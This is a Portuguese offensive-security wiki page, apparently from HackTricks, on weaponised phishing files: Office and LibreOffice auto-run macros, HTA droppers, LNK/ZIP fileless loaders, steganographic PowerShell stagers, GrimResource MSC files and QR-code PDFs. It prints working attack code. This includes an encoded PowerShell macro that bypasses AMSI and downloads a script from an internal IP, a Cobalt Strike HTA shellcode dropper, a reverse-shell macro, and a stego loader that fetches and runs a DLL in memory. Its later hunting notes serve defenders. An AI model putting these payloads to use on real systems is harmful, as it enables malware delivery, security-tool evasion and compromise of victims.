# Arquivos e documentos de phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos do Office

O Microsoft Word realiza a validação dos dados do arquivo antes de abri-lo. A validação dos dados é feita por meio da identificação da estrutura dos dados, de acordo com o padrão OfficeOpenXML. Se ocorrer algum erro durante a identificação da estrutura dos dados, o arquivo analisado não será aberto.

Normalmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando a extensão e ainda manter a capacidade de executar macros.\
Por exemplo, um arquivo RTF não oferece suporte a macros por design, mas um arquivo DOCM renomeado para RTF será processado pelo Microsoft Word e poderá executar macros.\
Os mesmos mecanismos internos se aplicam a todos os softwares do Microsoft Office Suite (Excel, PowerPoint etc.).

Você pode usar o seguinte comando para verificar quais extensões serão executadas por alguns programas do Office:

```bash
assoc | findstr /i "word excel powerp"
```

Arquivos DOCX que fazem referência a um template remoto (File –Options –Add-ins –Manage: Templates –Go) que inclui macros também podem “executar” macros.

### Carregamento de imagem externa

Vá para: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture e **Filename or URL**:_ http://<ip>/whatever

![Documentos do Office - Carregamento de imagem externa: Vá para: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor de macros

É possível usar macros para executar código arbitrário a partir do documento.

#### Funções de carregamento automático

Quanto mais comuns forem, maior a probabilidade de o AV detectá-las.

- AutoOpen()
- Document_Open()

#### Exemplos de código de macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Remover metadados manualmente

Vá para **File > Info > Inspect Document > Inspect Document**, o que abrirá o Document Inspector. Clique em **Inspect** e, em seguida, em **Remove All** ao lado de **Document Properties and Personal Information**.

#### Extensão do documento

Quando terminar, selecione o menu suspenso **Save as type** e altere o formato de **`.docx`** para Word 97-2003 **`.doc`**.\
Faça isso porque **não é possível salvar macros dentro de um `.docx`** e há um **estigma** **em torno da** extensão **`.docm`**, habilitada para macros (por exemplo, o ícone da miniatura tem um `!` enorme e alguns gateways da Web/e-mail os bloqueiam completamente). Portanto, a extensão **legada `.doc` é o melhor compromisso**.

#### Geradores de macros maliciosas

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros de execução automática (Basic) do LibreOffice ODT

Documentos do LibreOffice Writer podem incorporar macros Basic e executá-las automaticamente quando o arquivo é aberto, vinculando a macro ao evento **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Uma macro simples de reverse shell é assim:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Observe as aspas duplicadas (`""`) dentro da string — o LibreOffice Basic usa-as para escapar aspas literais, portanto payloads que terminam com `...==""")` mantêm equilibrados tanto o comando interno quanto o argumento de Shell.

Dicas de entrega:

- Salve como `.odt` e associe a macro ao evento do documento para que seja executada imediatamente ao abrir.
- Ao enviar um email com `swaks`, use `--attach @resume.odt` (o `@` é necessário para que os bytes do arquivo, e não a string do nome do arquivo, sejam enviados como anexo). Isso é fundamental ao abusar de servidores SMTP que aceitam destinatários arbitrários em `RCPT TO` sem validação.

## Arquivos HTA

Um HTA é um programa do Windows que **combina HTML e linguagens de scripting (como VBScript e JScript)**. Ele gera a interface do usuário e é executado como um aplicativo "totalmente confiável", sem as restrições do modelo de segurança de um navegador.

Um HTA é executado usando **`mshta.exe`**, que normalmente é **instalado** junto com o **Internet Explorer**, tornando o **`mshta` dependente do IE**. Portanto, se ele tiver sido desinstalado, os HTAs não poderão ser executados.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Forçando autenticação NTLM

Há várias maneiras de **forçar a autenticação NTLM "remotamente"**. Por exemplo, você poderia adicionar **imagens invisíveis** a e-mails ou a páginas HTML que o usuário acessará (até mesmo via HTTP MitM?). Ou enviar à vítima o **endereço de arquivos** que **disparem** uma **autenticação** só por **abrir a pasta**.

**Confira estas ideias e outras nas páginas a seguir:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Não se esqueça de que você não pode apenas roubar o hash ou a autenticação, mas também **realizar ataques NTLM relay**:

- [**Ataques NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay para certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Loaders LNK + payloads incorporados em ZIP (cadeia fileless)

Campanhas altamente eficazes entregam um ZIP que contém dois documentos-isca legítimos (PDF/DOCX) e um .lnk malicioso. O truque é que o loader PowerShell real fica armazenado nos bytes brutos do ZIP após um marcador exclusivo, e o .lnk extrai e executa o código totalmente na memória.<sup>[[2]](#references)</sup>

Fluxo típico implementado pelo comando PowerShell de uma linha no .lnk:

1) Localizar o ZIP original em caminhos comuns: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e o diretório pai do diretório de trabalho atual.
2) Ler os bytes do ZIP e encontrar um marcador definido no código (por exemplo, xFIQCV). Tudo o que vem após o marcador é o payload PowerShell incorporado.
3) Copiar o ZIP para %ProgramData%, extraí-lo ali e abrir o .docx-isca para parecer legítimo.
4) Bypassar o AMSI para o processo atual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar o próximo estágio (por exemplo, remover todos os caracteres #) e executá-lo na memória.

Exemplo de estrutura PowerShell para extrair e executar o estágio incorporado:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notas
- A entrega frequentemente abusa de subdomínios PaaS confiáveis (por exemplo, *.herokuapp.com) e pode filtrar os payloads (servir ZIPs benignos com base no IP/UA).
- O próximo estágio frequentemente descriptografa shellcode em base64/XOR e o executa via Reflection.Emit + VirtualAlloc para minimizar artefatos em disco.

Persistência usada na mesma cadeia
- Sequestro de COM TypeLib do controle Microsoft Web Browser para que o IE/Explorer ou qualquer aplicativo que o incorpore inicie novamente o payload automaticamente.<sup>[[2]](#references)[[4]](#references)</sup> Consulte os detalhes e comandos prontos para uso aqui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Investigação/IOCs
- Arquivos ZIP contendo a string marcadora ASCII (por exemplo, xFIQCV) anexada aos dados do arquivo.
- Um .lnk que enumera pastas pai/do usuário para localizar o ZIP e abre um documento-isca.
- Adulteração do AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Longas conversas de negócios terminando com links hospedados em domínios PaaS confiáveis.

## Encenação com isca .lnk primeiro → persistência por tarefa agendada → side-loading de CPL confiável

Outro padrão recorrente é um **`.lnk` que se faz passar por um documento** e abre imediatamente uma isca benigna enquanto prepara a cadeia real em segundo plano.<sup>[[3]](#references)</sup>

Fluxo observado:
1. O atalho **se disfarça de PDF** e usa `conhost.exe` ou um proxy semelhante para iniciar um downloader PowerShell ofuscado.
2. O PowerShell fragmenta tokens óbvios (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) para que detecções ingênuas que procuram `iwr`, `gci`, `ren`, `cpi` ou `schtasks` não identifiquem o comando.
3. O stager baixa primeiro o **documento-isca**, abre-o para a vítima e depois reconstrói os arquivos maliciosos em segundo plano.
4. Os payloads podem ser gravados com **extensões falsas** e depois renomeados removendo caracteres de preenchimento, adiando o aparecimento de artefatos óbvios `.exe` / `.cpl`.
5. A persistência é estabelecida com uma **tarefa agendada baseada em minutos** que inicia um binário de host confiável a partir de um caminho gravável pelo usuário.

Pistas mínimas para investigar esse padrão:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Um layout de staging útil para reconhecer é:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ou `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Por que o segundo estágio é furtivo

No estudo de caso da Rapid7, a tarefa agendada iniciava repetidamente **`Fondue.exe`** a partir de `C:\Users\Public\`. Como **`APPWIZ.cpl`** foi colocado no mesmo diretório e exportava **`RunFODW`**, o binário confiável da Microsoft carregava lateralmente o CPL do atacante, em vez da cópia legítima do sistema.

O CPL então:
- Lê um blob **AES-256-CBC** de `C:\Windows\Tasks\editor.dat`
- Descriptografa-o usando **Windows CNG / `bcrypt.dll`**
- Aloca memória executável e copia o shellcode descriptografado
- Executa-o indiretamente, passando o ponteiro do shellcode como callback para **`EnumUILanguagesW`**

Vale a pena procurar separadamente essa última etapa: muitas vezes, o malware evita um salto direto `((void(*)())buf)()` e, em vez disso, abusa de uma **WinAPI legítima que aceita callbacks** para transferir a execução.

O payload descriptografado nesta campanha era shellcode **Donut**, que mapeava o PE final totalmente na memória e aplicava patches em **AMSI/WLDP/ETW** no processo atual antes de transferir a execução. Para notas mais detalhadas sobre side-loading e pós-processamento residente na memória, consulte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pontos práticos para investigação:
- `.lnk` iniciando `powershell.exe` ou `conhost.exe`, seguido de um documento-isca visível.
- Downloads de curta duração para **`C:\Users\Public\`**, seguidos de renomeações imediatas a partir de extensões sem sentido.
- Tarefas agendadas com nomes genéricos, como `GoogleErrorReport`, executando a partir de **diretórios graváveis pelo usuário**.
- Binários confiáveis carregando arquivos **`.cpl` / `.dll`** do mesmo diretório não pertencente ao sistema.
- Blobs de texto Base64 gravados em **`C:\Windows\Tasks\`** e depois lidos pelo módulo carregado lateralmente.

## Payloads delimitados por esteganografia em imagens (stager PowerShell)

Cadeias de loader recentes entregam um JavaScript/VBS ofuscado que decodifica e executa um stager PowerShell em Base64. Esse stager baixa uma imagem (geralmente GIF) que contém uma DLL .NET codificada em Base64 e escondida como texto simples entre marcadores exclusivos de início/fim. O script busca esses delimitadores (exemplos encontrados em ambientes reais: «<<sudo_png>> … <<sudo_odt>>>»), extrai o texto entre eles, decodifica-o de Base64 para bytes, carrega o assembly na memória e invoca um método de entrada conhecido com a URL do C2.<sup>[[5]](#references)</sup>

Fluxo de trabalho
- Estágio 1: dropper JS/VBS arquivado → decodifica o Base64 incorporado → inicia o stager PowerShell com -nop -w hidden -ep bypass.
- Estágio 2: stager PowerShell → baixa a imagem, extrai o Base64 delimitado pelos marcadores, carrega a DLL .NET na memória e chama seu método (por exemplo, VAI), passando a URL do C2 e as opções.
- Estágio 3: o loader recupera o payload final e normalmente o injeta por meio de process hollowing em um binário confiável (comumente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Saiba mais sobre process hollowing e execução por proxy usando utilitários confiáveis aqui:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemplo de PowerShell para extrair uma DLL de uma imagem e invocar um método .NET na memória:

<details>
<summary>Extrator e loader de payload stego em PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notas
- Este é ATT&CK T1027.003 (esteganografia/ocultação de marcadores).<sup>[[6]](#references)</sup> Os marcadores variam entre campanhas.
- O bypass de AMSI/ETW e a desofuscação de strings são comumente aplicados antes de carregar o assembly.
- Hunting: procure delimitadores conhecidos em imagens baixadas; identifique o PowerShell acessando imagens e decodificando imediatamente blobs Base64.

Veja também ferramentas de stego e técnicas de carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging de PowerShell via Base64

Uma etapa inicial recorrente é um arquivo `.js` ou `.vbs` pequeno e fortemente ofuscado, entregue dentro de um arquivo compactado. Seu único propósito é decodificar uma string Base64 embutida e iniciar o PowerShell com `-nop -w hidden -ep bypass` para preparar a próxima etapa via HTTPS.<sup>[[5]](#references)</sup>

Lógica básica (abstrata):
- Ler o conteúdo do próprio arquivo
- Localizar um blob Base64 entre strings inúteis
- Decodificar para PowerShell em ASCII
- Executar usando `wscript.exe`/`cscript.exe` para iniciar `powershell.exe`

Indicadores de hunting
- Anexos JS/VBS em arquivos compactados iniciando `powershell.exe` com `-enc`/`FromBase64String` na linha de comando.
- `wscript.exe` iniciando `powershell.exe -nop -w hidden` a partir de caminhos temporários do usuário.

## Documentos MSC como contêineres de execução (GrimResource)

Arquivos Microsoft Management Console (`.msc`) são definições XML de consoles, normalmente abertas por `mmc.exe`. **GrimResource** transforma em arma uma referência `StringTable` a um recurso `apds.dll` que contém uma antiga primitiva XSS; assim, quando um usuário abre o console criado para esse fim, o JavaScript é executado dentro de `mmc.exe`. Amostras observadas combinaram ofuscação baseada em `transformNode` com **DotNetToJScript** para instanciar um payload .NET sem recorrer ao caminho usual de macros do Office.<sup>[[9]](#references)</sup>

Na triagem estática, trate um MSC não confiável como texto e **não** clique duas vezes nele:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Pivôs de alto sinal em runtime incluem `mmc.exe` carregando o CLR ou componentes de script, criando conexões de rede ou iniciando `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ou um executável inesperado. O formato é legítimo, portanto, as deteções devem correlacionar **origem + conteúdo XML/script suspeito + comportamento de `mmc.exe`**, em vez de bloquear todos os ficheiros MSC.<sup>[[9]](#references)</sup>

## Redirecionadores de PDF/QR e controlo de payload

Um PDF não precisa de um exploit para ser útil. Campanhas recentes colocam um **código QR ou link comum** num documento com aspeto inofensivo, desviam a sessão do browser dos controlos de email e personalizam o destino com o endereço do destinatário. A Microsoft documentou PDFs de 2025 cujos URLs de QR eram únicos para cada destinatário e levavam a uma infraestrutura de roubo de credenciais RaccoonO365; uma cadeia paralela usou controlo por IP/ambiente para apresentar um caminho JavaScript/MSI a visitantes selecionados, mas um PDF inofensivo a scanners ou clientes não autorizados.<sup>[[10]](#references)</sup>

Faça a triagem tanto das ações do PDF como dos códigos QR renderizados. Um QR pode ser desenhado em vetor, em vez de estar armazenado como uma imagem extraível, por isso rasterize todas as páginas, além de extrair as imagens incorporadas:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspecione destinos decodificados e redirecionamentos em um sistema de análise isolado, sem autenticar. Recursos úteis para investigação incluem PDFs contendo apenas QR codes com corpos de email quase vazios, o email do destinatário incorporado em um parâmetro de consulta, vários redirecionamentos por serviços de hospedagem confiáveis e conteúdo diferente retornado de acordo com o IP, a geolocalização, os cookies, o referrer ou o user agent. Compare solicitações com perfis controlados, pois uma única consulta feita por um sandbox pode receber apenas o chamariz.<sup>[[10]](#references)</sup>

## Arquivos do Windows para roubar hashes NTLM

Consulte a página sobre **locais para roubar credenciais NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – macro do LibreOffice → webshell do IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campanha ZipLine: um ataque de phishing sofisticado que tem como alvo empresas dos EUA](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: rastreando as táticas do Dropping Elephant em uma cadeia de loaders com temática chinesa](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nova técnica de persistência COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Loader PhantomVAI entrega uma variedade de infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console para acesso inicial e evasão](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Agentes de ameaças aproveitam a temporada de impostos para distribuir campanhas de phishing com temática fiscal](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
